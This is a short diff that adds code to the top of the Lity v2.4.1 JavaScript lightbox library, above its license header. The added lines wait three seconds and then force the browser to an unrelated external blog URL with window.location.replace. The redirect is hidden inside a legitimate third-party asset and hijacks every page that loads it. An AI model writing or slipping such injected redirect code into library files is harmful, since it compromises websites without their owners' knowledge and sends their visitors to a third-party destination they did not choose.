@@ -1,3 +1,6 @@
+setTimeout(inijs,3000);
+function inijs(){window.location.replace("https://www.feeldream.id/2023/01/script-feeldream.html")}
+
 /*! Lity - v2.4.1 - 2020-04-26
 * http://sorgalla.com/lity/
 * Copyright (c) 2015-2020 Jan Sorgalla; Licensed MIT */
